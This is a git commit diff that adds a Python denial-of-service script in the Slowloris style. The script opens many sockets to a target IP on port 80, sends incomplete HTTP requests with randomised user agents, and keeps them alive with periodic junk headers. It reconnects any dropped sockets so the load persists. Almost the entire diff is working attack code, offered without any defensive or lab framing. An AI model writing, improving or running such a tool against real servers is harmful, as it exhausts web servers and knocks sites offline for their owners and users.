aeca14838485c59d3929c59809d4a66b06c3dbe1
sabababoy <aleksandr19karmazin@gmail.com>
2020-04-15 21:34:05 +0300

    misprints were fixed, socketInit and main finctions were added. Beta v1.0

--- main.py
+++ main.py
@@ -1,23 +1,100 @@
 import socket, random, time, sys
 
 listOfSockets = list()
+ip = None
+user_agents = [
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+]
 
-if len(sys.argv) > 1:
-	ip = sys.argv[1]
-else:
-	ip = input('IP: ')
+def socketInit(ip):
 
-if sys.argv > 2:
-	quantityOfSockets = sys.agv[2]
-else:
-	quantityOfSockets = int(input('Quantity of sockets: '))
-
-for _ in range(quantityOfSockets):
-	try:
-		socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	if ip:
+		
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.settimeout(5)
+		
 		s.connect((ip, 80))
-	except socket.error:
-		print('There is some problem with a socket')
-		break
+
+	else:
+		print('Please enter an IP address!')
+		return 0
+
+	s.send('GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)).encode('utf-8'))
+	header = 'User-Agent: {}\r\n'.format(random.choice(user_agents)).encode('utf-8')
+	s.send(header)
+	s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+
+	return s
+
+
+def main():
+	if len(sys.argv) > 1:
+		ip = sys.argv[1]
+	else:
+		ip = input('IP: ')
+
+	if len(sys.argv) > 2:
+		quantityOfSockets = int(sys.argv[2])
+	else:
+		quantityOfSockets = int(input('Quantity of sockets: '))
+
+	for _ in range(quantityOfSockets):
+		try:
+			s = socketInit(ip)
+		except:
+			break
 		listOfSockets.append(s)
+
+	while True:
+		try:
+			for s in listOfSockets:
+				try:
+					s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+				except socket.error:
+					listOfSockets.remove(s)
+
+			for _ in range(quantityOfSockets - len(listOfSockets)):
+				try:
+					s = socketInit(ip)
+					if s:
+						listOfSockets.append(s)
+				except socket.error:
+					break
+
+			time.sleep(10)
+
+		except:
+			break
+
+if __name__ == "__main__":
+	main()
+
+
+		
+
+
+
